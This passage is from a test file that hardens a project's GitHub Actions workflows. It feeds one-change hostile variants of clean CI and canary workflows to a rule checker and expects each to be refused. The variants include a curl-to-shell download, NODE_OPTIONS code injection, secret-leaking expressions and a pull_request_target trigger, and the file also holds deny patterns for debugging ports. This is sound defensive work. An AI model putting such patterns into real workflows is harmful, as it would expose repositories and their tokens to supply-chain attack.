  it('does not let the manual workflow have the release privileges: its publish job may not write, nor may it use the token', () => {
    expect(workflowProblems(parse(GOOD_RELEASE), 'manual').length).toBeGreaterThan(0)
  })
})

/** A CI workflow that breaks no rule; each hostile one below changes one thing in it. */
const GOOD_CI = `
name: CI
on:
  push:
    branches: [main]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  checks:
    runs-on: ubuntu-24.04
    timeout-minutes: 60
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Install
        run: npm ci --ignore-scripts
      - name: Rust
        run: |
          cargo test --locked
`

describe('the rules for a CI workflow, proven on hostile workflows', () => {
  it('accept a CI workflow that breaks none', () => {
    expect(workflowProblems(parse(GOOD_CI), 'ci')).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a pull request trigger (a stranger\'s change would run here)', (t) => t.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'), /not only by a push to main/],
    ['pull_request_target (runs a stranger\'s change with this repository\'s rights)', (t) => t.replace('  workflow_dispatch:', '  pull_request_target:\n  workflow_dispatch:'), /not only by a push to main/],
    ['a schedule', (t) => t.replace('  workflow_dispatch:', '  schedule:\n    - cron: "0 3 * * *"\n  workflow_dispatch:'), /not only by a push to main/],
    ['workflow_run (chained to another workflow)', (t) => t.replace('  workflow_dispatch:', '  workflow_run:\n    workflows: [x]\n  workflow_dispatch:'), /not only by a push to main/],
    ['a push to every branch', (t) => t.replace('    branches: [main]', '    branches: ["**"]'), /not only by a push to main/],
    ['a push to another branch', (t) => t.replace('    branches: [main]', '    branches: [main, spike]'), /not only by a push to main/],
    ['a push of tags', (t) => t.replace('    branches: [main]', '    branches: [main]\n    tags: ["v*"]'), /not only by a push to main/],
    ['a push with no branch filter', (t) => t.replace('  push:\n    branches: [main]', '  push:'), /not only by a push to main/],
    ['no button', (t) => t.replace('  workflow_dispatch:\n', ''), /not only by a push to main/],
    ['a button with an input', (t) => t.replace('  workflow_dispatch:', '  workflow_dispatch:\n    inputs:\n      x:\n        type: string'), /not only by a push to main/],
    ['write permission', (t) => t.replace('contents: read\njobs', 'contents: write\njobs'), /permissions: \{ contents: read \}/],
    ['a job that widens its permissions', (t) => t.replace('    permissions:\n      contents: read', '    permissions:\n      contents: write'), /widens its permissions/],
    ['an action named by tag', (t) => t.replace(`actions/checkout@${sha('a')} # v1`, 'actions/checkout@v4'), /not a GitHub-owned action pinned/],
    ['a self-hosted runner', (t) => t.replace('ubuntu-24.04', 'self-hosted'), /not a GitHub-hosted runner/],
    ['a moving runner image', (t) => t.replace('ubuntu-24.04', 'ubuntu-latest'), /names its image/],
    ['a secret', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          T: ${{ secrets.T }}\n        run: npm ci --ignore-scripts'), /secret or the token/],
    ['the workflow token', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          T: ${{ github.token }}\n        run: npm ci --ignore-scripts'), /secret or the token/],
    ['a repository variable', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          V: ${{ vars.X }}\n        run: npm ci --ignore-scripts'), /reads a repository variable/],
    ['the updater key', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          TAURI_SIGNING_PRIVATE_KEY: x\n        run: npm ci --ignore-scripts'), /names the updater key/],
    ['an artifact upload (logs and artifacts of a public repository are public)', (t) => t.replace('      - name: Rust', `      - uses: actions/upload-artifact@${sha('b')} # v1\n        with:\n          name: x\n          path: y\n          retention-days: 1\n      - name: Rust`), /uploads an artifact/],
    ['a job with no time limit', (t) => t.replace('    timeout-minutes: 60\n', ''), /timeout-minutes/],
    ['a job with an hours-long time limit', (t) => t.replace('timeout-minutes: 60', 'timeout-minutes: 360'), /timeout-minutes/],
    ['npx', (t) => t.replace('run: npm ci --ignore-scripts', 'run: npx some-package'), /uses npx/],
    ['a download piped to a shell', (t) => t.replace('run: npm ci --ignore-scripts', 'run: curl -fsSL https://example.com/i.sh | sh'), /downloads or evaluates/],
    ['a value pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', 'run: echo ${{ github.head_ref }}'), /contains \$\{\{/],
    ['a step that may fail quietly', (t) => t.replace('        run: npm ci --ignore-scripts', '        continue-on-error: true\n        run: npm ci --ignore-scripts'), /continue-on-error/],
    ['a cargo test without --locked', (t) => t.replace('cargo test --locked', 'cargo test'), /not run with --locked/],
    ['a secret hidden behind a } inside an expression', (t) => t.replace('        run: npm ci --ignore-scripts', "        env:\n          T: ${{ format('{0}', secrets.T) }}\n        run: npm ci --ignore-scripts"), /secret or the token/],
    ['a variable hidden behind a } inside an expression', (t) => t.replace('        run: npm ci --ignore-scripts', "        env:\n          V: ${{ format('{0}', vars.X) }}\n        run: npm ci --ignore-scripts"), /reads a repository variable/],
    ['the token spelled with brackets', (t) => t.replace('        run: npm ci --ignore-scripts', "        env:\n          T: ${{ github['token'] }}\n        run: npm ci --ignore-scripts"), /secret or the token/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD_CI)

    expect(changed).not.toBe(GOOD_CI)
    expect(workflowProblems(parse(changed), 'ci').join(' | ')).toMatch(expected)
  })

  it('are not met by the manual rules alone: a push trigger is refused there, as before', () => {
    expect(workflowProblems(parse(GOOD_CI), 'manual').join(' | ')).toMatch(/not by hand only/)
  })
})

const GOOD_CANARY = `
name: Canary
on:
  schedule:
    - cron: '17 5 * * *'
  workflow_dispatch:
permissions:
  contents: read
jobs:
  public-files:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Install
        run: npm ci --ignore-scripts
      - name: Verify
        env:
          GH_TOKEN: \${{ github.token }}
        run: npm run release:verify
  previous-release:
    runs-on: windows-2025
    timeout-minutes: 20
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Install
        run: npm ci --ignore-scripts
      - name: Install the previous release
        env:
          GH_TOKEN: \${{ github.token }}
        run: npm run canary:install
`

/**
 * The canary (Phase 31, task 31.9): runs once a day on a schedule and by hand, and holds the workflow's own READ-ONLY token for exactly two
 * commands. It is the one workflow that runs unattended and reads from GitHub, so it is allowed nothing it does not need: no other trigger,
 * no secret, no write, no artifact, no cache, and only the three commands it runs.
 */
describe('the rules for a canary workflow, proven on hostile workflows', () => {
  it('accept a canary workflow that breaks none', () => {
    expect(workflowProblems(parse(GOOD_CANARY), 'canary')).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a push trigger', (t) => t.replace('  workflow_dispatch:', '  push:\n    branches: [main]\n  workflow_dispatch:'), /not only by one daily schedule/],
    ['a pull request trigger (a stranger\'s change would run here with the token)', (t) => t.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'), /not only by one daily schedule/],
    ['pull_request_target', (t) => t.replace('  workflow_dispatch:', '  pull_request_target:\n  workflow_dispatch:'), /not only by one daily schedule/],
    ['workflow_run (chained to another workflow)', (t) => t.replace('  workflow_dispatch:', '  workflow_run:\n    workflows: [x]\n  workflow_dispatch:'), /not only by one daily schedule/],
    ['no schedule', (t) => t.replace("  schedule:\n    - cron: '17 5 * * *'\n", ''), /not only by one daily schedule/],
    ['two schedules', (t) => t.replace("    - cron: '17 5 * * *'", "    - cron: '17 5 * * *'\n    - cron: '47 17 * * *'"), /not only by one daily schedule/],
    ['a schedule that runs every minute', (t) => t.replace("'17 5 * * *'", "'* * * * *'"), /not only by one daily schedule/],
    ['a schedule that runs every five minutes', (t) => t.replace("'17 5 * * *'", "'*/5 * * * *'"), /not only by one daily schedule/],
    ['a schedule that runs every hour', (t) => t.replace("'17 5 * * *'", "'17 * * * *'"), /not only by one daily schedule/],
    ['a weekly schedule', (t) => t.replace("'17 5 * * *'", "'17 5 * * 1'"), /not only by one daily schedule/],
    ['no button', (t) => t.replace('  workflow_dispatch:\n', ''), /not only by one daily schedule/],
    ['a button with an input', (t) => t.replace('  workflow_dispatch:', '  workflow_dispatch:\n    inputs:\n      x:\n        type: string'), /not only by one daily schedule/],
    ['write permission', (t) => t.replace('contents: read\njobs', 'contents: write\njobs'), /permissions: \{ contents: read \}/],
    ['a job that widens its permissions', (t) => t.replace('    permissions:\n      contents: read', '    permissions:\n      contents: write'), /widens its permissions/],
    ['an action named by tag', (t) => t.replace(`actions/checkout@${sha('a')} # v1`, 'actions/checkout@v4'), /not a GitHub-owned action pinned/],
    ['a self-hosted runner', (t) => t.replace('windows-2025', 'self-hosted'), /not a GitHub-hosted runner/],
    ['a moving runner image', (t) => t.replace('ubuntu-24.04', 'ubuntu-latest'), /names its image/],
    ['a secret', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          T: ${{ secrets.T }}\n        run: npm ci --ignore-scripts'), /secret or the token/],
    ['the token under another name', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'GITHUB_TOKEN: ${{ github.token }}'), /secret or the token/],
    ['the token handed to every step of a job', (t) => t.replace('    timeout-minutes: 20\n    permissions:', '    timeout-minutes: 20\n    env:\n      GH_TOKEN: ${{ github.token }}\n    permissions:'), /hands the token to every step/],
    ['the token at the workflow level', (t) => t.replace('permissions:\n  contents: read\njobs', 'permissions:\n  contents: read\nenv:\n  GH_TOKEN: ${{ github.token }}\njobs'), /secret or the token/],
    ['the token on a step that runs something else', (t) => t.replace('        run: npm run canary:install', '        run: npm run test'), /holds the token.*npm run test/],
    ['the token on the install step', (t) => t.replace('      - name: Install\n        run: npm ci --ignore-scripts', '      - name: Install\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: npm ci --ignore-scripts'), /holds the token.*npm ci/],
    ['a repository variable', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          V: ${{ vars.X }}\n        run: npm ci --ignore-scripts'), /reads a repository variable/],
    ['the updater key', (t) => t.replace('        run: npm ci --ignore-scripts', '        env:\n          TAURI_SIGNING_PRIVATE_KEY: x\n        run: npm ci --ignore-scripts'), /names the updater key/],
    ['an artifact upload (logs and artifacts of a public repository are public)', (t) => t.replace('      - name: Verify', `      - uses: actions/upload-artifact@${sha('b')} # v1\n        with:\n          name: x\n          path: y\n          retention-days: 1\n      - name: Verify`), /uploads an artifact/],
    ['a cache (a restored cache is code the token-holding step may run)', (t) => t.replace('          node-version-file: .node-version\n      - name: Install\n        run: npm ci --ignore-scripts\n      - name: Verify', '          node-version-file: .node-version\n          cache: npm\n      - name: Install\n        run: npm ci --ignore-scripts\n      - name: Verify'), /uses a cache/],
    ['the cache action', (t) => t.replace('      - name: Verify', `      - uses: actions/cache@${sha('d')} # v1\n        with:\n          path: x\n          key: y\n      - name: Verify`), /uses a cache/],
    ['a job with no time limit', (t) => t.replace('    timeout-minutes: 20\n', ''), /timeout-minutes/],
    ['a job with an hours-long time limit', (t) => t.replace('timeout-minutes: 20', 'timeout-minutes: 360'), /timeout-minutes/],
    ['npm ci without --ignore-scripts (a package script would run in a job that holds a token next)', (t) => t.replace('run: npm ci --ignore-scripts', 'run: npm ci'), /not one of the canary's commands/],
    ['a command that is not one of its three', (t) => t.replace('run: npm run release:verify', 'run: npm run release:audit'), /not one of the canary's commands/],
    ['a second command in the same script', (t) => t.replace('run: npm run release:verify', 'run: |\n          npm run release:verify\n          echo done'), /not one of the canary's commands/],
    ['npx', (t) => t.replace('run: npm ci --ignore-scripts', 'run: npx some-package'), /uses npx/],
    ['a download piped to a shell', (t) => t.replace('run: npm ci --ignore-scripts', 'run: curl -fsSL https://example.com/i.sh | sh'), /downloads or evaluates/],
    ['a value pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', 'run: echo ${{ github.head_ref }}'), /contains \$\{\{/],
    ['a step that may fail quietly', (t) => t.replace('        run: npm run release:verify', '        continue-on-error: true\n        run: npm run release:verify'), /continue-on-error/],
    ['a job that may fail quietly (so the run is green when the canary is red)', (t) => t.replace('    timeout-minutes: 20\n    permissions:', '    timeout-minutes: 20\n    continue-on-error: true\n    permissions:'), /continue-on-error/],
    ['code loaded into the token-holding command (NODE_OPTIONS next to the token)', (t) => t.replace('          GH_TOKEN: ${{ github.token }}\n        run: npm run release:verify', '          GH_TOKEN: ${{ github.token }}\n          NODE_OPTIONS: --require ./x.js\n        run: npm run release:verify'), /may hold only GH_TOKEN/],
    ['another environment variable on a step that has no token', (t) => t.replace('      - name: Install\n        run: npm ci --ignore-scripts', '      - name: Install\n        env:\n          NODE_OPTIONS: --require ./x.js\n        run: npm ci --ignore-scripts'), /sets env/],
    ['a shell chosen for a step', (t) => t.replace('        run: npm run release:verify', '        shell: bash -c "{0}; echo hi"\n        run: npm run release:verify'), /uses the step key shell/],
    ['a working directory for a step', (t) => t.replace('        run: npm run release:verify', '        working-directory: web\n        run: npm run release:verify'), /uses the step key working-directory/],
    ['a condition on a step', (t) => t.replace('        run: npm run release:verify', "        if: github.event_name == 'schedule'\n        run: npm run release:verify"), /uses the step key if/],
    ['a step id', (t) => t.replace('      - name: Verify\n', '      - name: Verify\n        id: v\n'), /uses the step key id/],
    ['an action that reads the workflow token by default (github-script)', (t) => t.replace('      - name: Verify', `      - uses: actions/github-script@${sha('e')} # v1\n        with:\n          script: x\n      - name: Verify`), /uses an action other than checkout and setup-node/],
    ['the checkout of another ref', (t) => t.replace('          persist-credentials: false', '          persist-credentials: false\n          ref: refs/pull/1/head'), /with: only persist-credentials/],
    ['the checkout of another repository', (t) => t.replace('          persist-credentials: false', '          persist-credentials: false\n          repository: someone/else'), /with: only persist-credentials/],
    ['setup-node with a registry (it writes an .npmrc)', (t) => t.replace('          node-version-file: .node-version', '          node-version-file: .node-version\n          registry-url: https://example.com'), /with: only node-version-file/],
    ['a workflow-level environment', (t) => t.replace('permissions:\n  contents: read\njobs', 'permissions:\n  contents: read\nenv:\n  NODE_OPTIONS: --require ./x.js\njobs'), /workflow key env/],
    ['workflow-level defaults (a shell for every step)', (t) => t.replace('permissions:\n  contents: read\njobs', 'permissions:\n  contents: read\ndefaults:\n  run:\n    shell: bash\njobs'), /workflow key defaults/],
    ['a concurrency group', (t) => t.replace('permissions:\n  contents: read\njobs', 'permissions:\n  contents: read\nconcurrency: x\njobs'), /workflow key concurrency/],
    ['a job environment (every step of the job gets it)', (t) => t.replace('    timeout-minutes: 20\n    permissions:', '    timeout-minutes: 20\n    env:\n      NODE_OPTIONS: --require ./x.js\n    permissions:'), /job public-files uses the job key env/],
    ['a container for a job', (t) => t.replace('    timeout-minutes: 20\n    permissions:', '    timeout-minutes: 20\n    container: node:22\n    permissions:'), /uses the job key container/],
    ['a matrix', (t) => t.replace('    timeout-minutes: 20\n    permissions:', '    timeout-minutes: 20\n    strategy:\n      matrix:\n        x: [1]\n    permissions:'), /uses the job key strategy/],
    ['a condition on a job', (t) => t.replace('    timeout-minutes: 20\n    permissions:', "    timeout-minutes: 20\n    if: github.actor == 'x'\n    permissions:"), /uses the job key if/],
    ['a service container', (t) => t.replace('    timeout-minutes: 20\n    permissions:', '    timeout-minutes: 20\n    services:\n      x:\n        image: y\n    permissions:'), /uses the job key services/],
    ['a secret hidden behind a } inside an expression', (t) => t.replace('GH_TOKEN: ${{ github.token }}', "GH_TOKEN: ${{ format('{0}', secrets.PAT) }}"), /secret or the token|GH_TOKEN must be exactly/],
    ['a repository variable hidden behind a } inside an expression', (t) => t.replace('      - name: Verify\n', "      - name: ${{ format('{0}', vars.X) }}\n"), /reads a repository variable/],
    ['the token spelled with brackets', (t) => t.replace('GH_TOKEN: ${{ github.token }}', "GH_TOKEN: ${{ github['token'] }}"), /secret or the token|GH_TOKEN must be exactly/],
    ['the whole context as text', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'GH_TOKEN: ${{ toJSON(github) }}'), /GH_TOKEN must be exactly/],
    ['a literal value in the token variable', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'GH_TOKEN: abc'), /GH_TOKEN must be exactly/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD_CANARY)

    expect(changed).not.toBe(GOOD_CANARY)
    expect(workflowProblems(parse(changed), 'canary').join(' | ')).toMatch(expected)
  })

  it('are not met by the CI rules or the manual rules alone: a schedule is refused there, as before', () => {
    expect(workflowProblems(parse(GOOD_CANARY), 'ci').join(' | ')).toMatch(/not only by a push to main/)
    expect(workflowProblems(parse(GOOD_CANARY), 'manual').join(' | ')).toMatch(/not by hand only/)
  })

  it('keep the token out of every other profile: the CI rules refuse it where the canary rules allow it', () => {
    const asCi = GOOD_CANARY.replace("  schedule:\n    - cron: '17 5 * * *'\n", '  push:\n    branches: [main]\n')

    expect(workflowProblems(parse(asCi), 'ci').join(' | ')).toMatch(/secret or the token/)
  })
})

/**
 * What the canary's token-holding steps RUN is not in the workflow file: it is `package.json` and the tools. A hostile commit there could run
 * code with the read-only token. These checks are a tripwire for drift, not a defence against a pusher (whoever can push can edit this test
 * too): the real controls are that only the owner pushes, branch protection and two-factor sign-in. They make the quiet ways visible: an npm
 * hook for either command, an `.npmrc`, and a package manager field that makes `setup-node` cache by itself.
 */
describe('what the canary runs (31.9)', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as { scripts: Record<string, string>; packageManager?: unknown; devEngines?: unknown }

  it('runs the two commands as plain tsx lines on the tools, and nothing else', () => {
    expect(pkg.scripts['release:verify']).toBe('tsx server/src/tools/releaseVerify.ts')
    expect(pkg.scripts['canary:install']).toBe('tsx server/src/tools/releaseCanary.ts')
  })

  it.each(['release:verify', 'canary:install'])('has no npm hook before or after %s (npm runs pre and post scripts by name, with the token in the environment)', (command) => {
    expect(pkg.scripts[`pre${command}`]).toBeUndefined()
    expect(pkg.scripts[`post${command}`]).toBeUndefined()
  })

  it('has no .npmrc in the repository (script-shell and onload-script run code in every npm command)', () => {
    expect(readdirSync(ROOT)).not.toContain('.npmrc')
  })

  it('names no package manager in package.json (setup-node would then restore and save an npm cache by itself, and the canary has no way to opt out)', () => {
    expect(pkg.packageManager).toBeUndefined()
    expect(pkg.devEngines).toBeUndefined()
  })
})

describe('the canary workflow (31.9)', () => {
  const text = readFileSync(join(WORKFLOWS, 'canary.yml'), 'utf8')
  const workflow = loadYaml(text) as Workflow
  const runnerOf = (command: string) =>
    Object.values(workflow.jobs).find((job) => (job.steps ?? []).some((step) => step.run?.trim() === command))?.['runs-on']

  it('runs the public check of the newest release on Linux, and the install of the previous one on Windows, where the app ships', () => {
    expect(runnerOf('npm run release:verify')).toBe('ubuntu-24.04')
    expect(runnerOf('npm run canary:install')).toBe('windows-2025')
  })

  it('hands the token to those two steps and to nothing else', () => {
    const holders = Object.values(workflow.jobs).flatMap((job) => (job.steps ?? []).filter((step) => step.env?.['GH_TOKEN'] !== undefined).map((step) => step.run?.trim()))

    expect(holders.sort()).toEqual(['npm run canary:install', 'npm run release:verify'])
  })

  it('runs once a day, early, off the hour, so a red run is there when the day starts', () => {
    const on = workflow.on as { schedule?: { cron: string }[] }

    expect(on.schedule).toHaveLength(1)
    expect(on.schedule![0]!.cron).toMatch(/^\d{1,2} ([0-9]|1[01]) \* \* \*$/)
    expect(on.schedule![0]!.cron.startsWith('0 ')).toBe(false)
  })
})

describe('the CI workflow (31.1)', () => {
  const text = readFileSync(join(WORKFLOWS, 'ci.yml'), 'utf8')
  const workflow = loadYaml(text) as Workflow
  const runs = Object.values(workflow.jobs).flatMap((job) => (job.steps ?? []).map((step) => step.run ?? ''))
  const lines = runs.flatMap((run) => run.split('\n').map((line) => line.trim()))

  // What it promises (docs/tasks/plan.md Phase 31, 31.1): a rule that is dropped from the file must fail here.
  it.each([
    ['the key and secret scan', 'npm run secrets:scan'],
    ['the type check', 'npm run typecheck'],
    ['the linter', 'npm run lint'],
    ['the server tests', 'npm run test -w @listulator/server'],
    ['the web tests', 'npm run test -w @listulator/web'],
    ['the browser tests', 'npm run test:e2e -w @listulator/web'],
    ['the notices check', 'git diff --exit-code -- THIRD-PARTY-NOTICES.txt'],
  ])('runs %s', (_name, command) => {
    expect(lines.some((line) => line.startsWith(command))).toBe(true)
  })

  it('runs the Rust tests on Windows, where the desktop app ships, and the web checks on Linux', () => {
    const runners = Object.fromEntries(Object.entries(workflow.jobs).map(([name, job]) => [name, job['runs-on']]))

    expect(Object.values(runners)).toEqual(expect.arrayContaining(['ubuntu-24.04', 'windows-2025']))
    expect(lines.some((line) => /^cargo test .*--locked/.test(line))).toBe(true)
  })

  it('runs the secret scan before anything else that installs or builds more than the dependencies', () => {
    const scan = lines.findIndex((line) => line.startsWith('npm run secrets:scan'))
    const build = lines.findIndex((line) => /^npm run (typecheck|lint|test)/.test(line))

    expect(scan).toBeGreaterThanOrEqual(0)
    expect(scan).toBeLessThan(build)
  })
})

describe('GitHub Actions workflows', () => {
  const workflows = readdirSync(WORKFLOWS)
    .filter((name) => /\.ya?ml$/.test(name))
    .map((name) => ({ name, workflow: loadYaml(readFileSync(join(WORKFLOWS, name), 'utf8')) as Workflow }))

  it('exist (an empty folder would make every rule below pass on nothing)', () => {
    expect(workflows.map((entry) => entry.name)).toEqual(expect.arrayContaining(['canary.yml', 'ci.yml', 'desktop-windows.yml', 'release.yml']))
  })

  // `release.yml` is judged by the release rules, `ci.yml` by the CI rules, `canary.yml` by the canary rules; any other workflow, including one added later, by the strict manual ones.
  const profileOf = (name: string): Profile => (name === 'release.yml' ? 'release' : name === 'ci.yml' ? 'ci' : name === 'canary.yml' ? 'canary' : name === 'updater-test-windows.yml' ? 'updaterTest' : 'manual')
  it.each(workflows)('$name breaks none of the rules', ({ name, workflow }) => {
    expect(workflowProblems(workflow, profileOf(name))).toEqual([])
  })
})

/**
 * The versions the repository builds with are written down once each and are exact (security review, Phase 19, SR-041): the compiler in
 * `rust-toolchain.toml`, Node in `.node-version`. The workflow reads both (the rules above), Cargo's own `rust-version` agrees with the
 * compiler, so a bump is one deliberate commit that changes these files together and says why in docs/DECISIONS.md.
 */
describe('the pinned toolchain', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const EXACT = /^\d+\.\d+\.\d+$/
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const toolchain = read('rust-toolchain.toml')
  const channel = /^channel\s*=\s*"([^"]+)"/m.exec(toolchain)?.[1]

  it('names Node exactly, once, in .node-version', () => {
    expect(read('.node-version').trim()).toMatch(EXACT)
  })

  it('names the Rust compiler exactly, once, in rust-toolchain.toml, with the minimal profile', () => {
    expect(channel).toMatch(EXACT)
    expect(toolchain).toMatch(/^profile\s*=\s*"minimal"/m)
    // The settings, not the comments (which explain why "stable" is not used).
    expect(toolchain.replace(/^\s*#.*$/gm, '')).not.toMatch(/\b(stable|beta|nightly)\b/)
  })

  it('has Cargo.toml say the same compiler as its minimum (a lower number was never tried)', () => {
    expect(/^rust-version\s*=\s*"([^"]+)"/m.exec(read('apps/desktop/src-tauri/Cargo.toml'))?.[1]).toBe(channel)
  })

  it('is what the root package says it runs on: Node at the version file or above within the same major', () => {
    const engines = (JSON.parse(read('package.json')) as { engines?: { node?: string } }).engines?.node ?? ''
    const major = Number(read('.node-version').trim().split('.')[0])

    expect(engines).toMatch(/^>=\d+/)
    expect(Number(engines.replace(/^>=/, ''))).toBeLessThanOrEqual(major)
  })
})


/**
 * The switch that makes `tauri build` produce update files lives in an overlay that only `release.yml` passes (20.12a, DECISIONS
 * 2026-10-11). In the shared config it would make every bundling build, the owner's own included, fail without a private key.
 */
describe('the updater-artifacts overlay', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const overlay = JSON.parse(read('apps/desktop/src-tauri/tauri.updater-artifacts.conf.json')) as Record<string, unknown>
  const shared = JSON.parse(read('apps/desktop/src-tauri/tauri.conf.json')) as { bundle?: Record<string, unknown>; plugins?: { updater?: Record<string, unknown> } }

  it('holds the one switch and nothing else: no key, no endpoint, no insecure flag', () => {
    expect(Object.fromEntries(Object.entries(overlay).filter(([key]) => key !== '$schema'))).toEqual({ bundle: { createUpdaterArtifacts: true } })
  })

  it('is not in the shared config, which stays buildable without a key', () => {
    expect(shared.bundle).not.toHaveProperty('createUpdaterArtifacts')
  })

  it('is the file the release workflow passes, by the path the guard above requires', () => {
    expect(UPDATER_OVERLAY).toBe('src-tauri/tauri.updater-artifacts.conf.json')
    expect(read('.github/workflows/release.yml')).toContain(`--config ${UPDATER_OVERLAY}`)
  })

  it('leaves the updater plugin config (the real public key, a signed version, https only) to the shared config', () => {
    expect(shared.plugins?.updater).toMatchObject({ requireSignedVersion: true })
    expect(JSON.stringify(shared.plugins?.updater)).not.toMatch(/dangerous/)
  })
})

/**
 * The test build of the updater (20.13a, DECISIONS 2026-10-11). Two versions of the app are installed and updated over `http://127.0.0.1`,
 * which needs an insecure-transport flag. That flag, the local endpoint and the separate app identity live in ONE file that no release
 * path can reach: the release config and `release.yml` never carry or name it, and only the hand-started test workflow passes it.
 */
describe('the updater test build', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const TEST_CONFIG = 'apps/desktop/src-tauri/tauri.updater-test.conf.json'
  const testConfig = JSON.parse(read(TEST_CONFIG)) as {
    productName?: string
    identifier?: string
    plugins?: { updater?: Record<string, unknown> }
  } & Record<string, unknown>
  const release = JSON.parse(read('apps/desktop/src-tauri/tauri.conf.json')) as {
    productName: string
    identifier: string
    plugins: { updater: { endpoints: string[] } }
  }

  it('is a separate app: its own identifier and product name, so a test install never touches a real install or its data folder', () => {
    expect(testConfig.identifier).toBe('com.listulator.desktop.updatertest')
    expect(testConfig.identifier).not.toBe(release.identifier)
    expect(testConfig.productName).toBe('ListulatorUpdaterTest')
    expect(testConfig.productName).not.toBe(release.productName)
  })

  it('points at the local endpoint only, with the insecure flag, and changes nothing else about the updater (the real public key stays)', () => {
    expect(testConfig.plugins?.updater).toEqual({
      endpoints: ['http://127.0.0.1:8099/latest.json'],
      dangerousInsecureTransportProtocol: true,
    })
    expect(Object.keys(testConfig).sort()).toEqual(['$schema', 'app', 'identifier', 'plugins', 'productName'])
  })

  // The update test drives the installed app through WebView2's debugging port (31.2: the environment variable is not honoured by this app, the
  // window's own `additionalBrowserArgs` is). So the TEST build's window opens a port, and no shipped build may: a port that any local program
  // can talk to is the app's whole page, its data and its updater.
  describe('the debugging port of the update test', () => {
    const PRODUCTION_ARGS = '--disable-features=msWebOOUI,msPdfOOUI,msSmartScreenProtection --autoplay-policy=no-user-gesture-required'
    const windowsOf = (config: unknown) => (config as { app?: { windows?: Record<string, unknown>[] } }).app?.windows ?? []
    const releaseWindow = windowsOf(JSON.parse(read('apps/desktop/src-tauri/tauri.conf.json')))[0]!

    it('is the shipped window with one key added: the production browser arguments and the port, and nothing else changed', () => {
      expect(windowsOf(testConfig)).toEqual([{ ...releaseWindow, additionalBrowserArgs: `${PRODUCTION_ARGS} --remote-debugging-port=9222 --remote-allow-origins=*` }])
    })

    it('opens the port on the test app only: no other config, workflow or the release config carries a debugging port', () => {
      const others = readdirSync(join(ROOT, 'apps/desktop/src-tauri')).filter((name) => /^tauri.*\.json$/.test(name) && name !== 'tauri.updater-test.conf.json')
      expect(others).toContain('tauri.conf.json')
      for (const name of others) expect(read(`apps/desktop/src-tauri/${name}`), name).not.toMatch(/remote-debugging|remote-allow-origins/i)
      for (const name of readdirSync(WORKFLOWS)) expect(readFileSync(join(WORKFLOWS, name), 'utf8'), name).not.toMatch(/remote-debugging|remote-allow-origins|WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS/i)
      expect(read('apps/desktop/src-tauri/src/lib.rs')).not.toMatch(/remote-debugging|remote-allow-origins/i)
    })
  })

  it('is not in the release config, whose only endpoint is GitHub’s latest download over https and which has no dangerous* key anywhere', () => {
    const text = read('apps/desktop/src-tauri/tauri.conf.json')

    expect(release.plugins.updater.endpoints).toEqual(['https://github.com/gerharar/listulator/releases/latest/download/latest.json'])
    expect(text).not.toMatch(/dangerous|127\.0\.0\.1|updater-test/i)
    // `localhost` appears legitimately (the dev server's address, the IPC host in the CSP); the updater's own block must not have it or any plain http.
    expect(JSON.stringify(release.plugins)).not.toMatch(/localhost|http:/i)
  })

  it('is never named or carried by the release workflow, the updater-artifacts overlay, or any other workflow than its own', () => {
    for (const file of ['.github/workflows/release.yml', 'apps/desktop/src-tauri/tauri.updater-artifacts.conf.json']) {
      expect(read(file), file).not.toMatch(/updater-test|updater:test-config|dangerous|127\.0\.0\.1/i)
    }
    for (const name of readdirSync(WORKFLOWS).filter((file) => /\.ya?ml$/.test(file) && file !== 'updater-test-windows.yml')) {
      expect(readFileSync(join(WORKFLOWS, name), 'utf8'), name).not.toMatch(/updater-test|updater:test-config/)
    }
  })

  describe('the hand-started workflow that builds it', () => {
    const text = readFileSync(join(WORKFLOWS, 'updater-test-windows.yml'), 'utf8')
    const workflow = loadYaml(text) as Workflow
    const steps = Object.values(workflow.jobs).flatMap((job) => job.steps ?? [])
    const runs = steps.map((step) => step.run ?? '')

    it('passes the updater test rules (the manual rules, and the rules for its throw-away key)', () => {
      expect(workflowProblems(workflow, 'updaterTest')).toEqual([])
    })

    it('is started by hand with two required inputs: the app to install and the update it is offered', () => {
      expect(workflow.on).toEqual({
        workflow_dispatch: { inputs: { version: expect.objectContaining({ type: 'string', required: true }), update_version: expect.objectContaining({ type: 'string', required: true }) } },
      })
    })

